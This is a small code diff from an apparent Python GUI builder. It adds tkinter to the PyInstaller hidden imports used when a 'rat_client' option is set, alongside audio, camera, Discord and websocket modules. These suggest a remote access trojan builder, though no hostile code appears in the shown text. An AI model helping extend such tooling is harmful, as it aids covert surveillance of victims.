@@ -490,6 +490,7 @@ class App(customtkinter.CTk):
             '--hidden-import', 'websocket', 
             '--hidden-import', 'discord',
             '--hidden-import', 'pyaudio',
+            '--hidden-import', 'tkinter',
             '--hidden-import','cv2'
         ] if rat_client else []
 
